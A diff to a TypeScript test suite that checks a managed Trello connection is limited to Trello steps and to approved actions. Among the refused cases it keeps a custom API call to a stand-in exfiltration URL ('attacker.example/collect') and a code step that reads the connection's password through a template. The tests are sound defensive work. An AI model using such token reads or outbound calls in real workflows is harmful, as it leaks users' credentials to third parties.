@@ -356,9 +356,11 @@ describe("managed Trello is scoped to Trello steps", () => {
     credentials.register(new JarvisTrelloConnectionSource(dataDir));
   });
   afterEach(() => rmSync(dataDir, { recursive: true, force: true }));
-  const card = (input: Record<string, unknown> = { auth: ref }, nextAction?: any): any => ({
-    name: "card", type: "PIECE", settings: { pieceName: TRELLO, actionName: "create_card", input }, ...(nextAction ? { nextAction } : {}),
+  const card = (input: Record<string, unknown> = { auth: ref }, nextAction?: any, actionName = "create_card"): any => ({
+    name: "card", type: "PIECE", settings: { pieceName: TRELLO, actionName, input }, ...(nextAction ? { nextAction } : {}),
   });
+  const trelloTrigger = (extra: Record<string, unknown> = {}): any => ({ name: "trigger", type: "PIECE_TRIGGER",
+    settings: { pieceName: TRELLO, triggerName: "new_card", input: { auth: ref }, ...extra } });
   const trelloCall = (url: string): any => ({ name: "call", type: "PIECE",
     settings: { pieceName: TRELLO, actionName: "custom_api_call", input: { auth: ref, method: "GET", url: { url } } } });
   const refused: Array<[string, any]> = [
@@ -367,6 +369,12 @@ describe("managed Trello is scoped to Trello steps", () => {
     ["a Gmail step auth", empty(gmail({ auth: ref }))],
     ["a Trello step next to a CODE step that reads the token", empty(card(undefined, code({ token: "{{connections['jarvis:trello'].password}}" })))],
     ["a Trello custom API call to another host", empty(trelloCall("https://attacker.example/collect"))],
+    // The managed connection runs only its qualified actions; the engine would refuse these too.
+    ["a Trello custom API call on api.trello.com", empty(trelloCall("https://api.trello.com/1/members/me"))],
+    ["a Trello action outside the managed set", empty(card({ auth: ref }, undefined, "delete_card"))],
+    ["a Trello trigger", trelloTrigger()],
+    ["a Trello trigger carrying a stray qualified actionName", trelloTrigger({ actionName: "create_card" })],
+    ["a Trello step carrying a stray triggerName", empty({ ...card(), settings: { ...card().settings, triggerName: "new_card" } })],
   ];
   for (const [label, trigger] of refused) {
     test(`${label} is not ready and the route refuses it`, async () => {
@@ -381,9 +389,14 @@ describe("managed Trello is scoped to Trello steps", () => {
     expect(issue!.message).toBe("Managed connection jarvis:trello can only be used by Trello steps");
     expect(issue!.allowedPieces).toEqual([TRELLO]);
   });
-  // The connection scope only: the managed Trello action list still refuses a custom API call on its own.
-  test("a Trello step auth, or a custom API call on api.trello.com, passes the connection scope and resolves", async () => {
-    for (const trigger of [empty(card()), empty(trelloCall("https://api.trello.com/1/members/me")), empty(trelloCall("/members/me"))]) {
+  test("a refused Trello trigger or action says the connection does not support it", () => {
+    for (const trigger of [trelloTrigger(), trelloTrigger({ actionName: "create_card" }), empty(card({ auth: ref }, undefined, "delete_card"))]) {
+      expect(bindingIssues(trigger).map(i => i.message)).toContain("This Trello connection does not support this action or trigger yet");
+    }
+  });
+  test("a Trello step auth on a qualified action passes the connection scope and resolves", async () => {
+    for (const actionName of ["list_boards", "list_lists", "get_card", "create_card", "move_card"]) {
+      const trigger = empty(card({ auth: ref }, undefined, actionName));
       expect(bindingIssues(trigger)).toEqual([]);
       const response = await fetchFor(runOf(trigger), "jarvis:trello");
       expect(response.status).toBe(200);
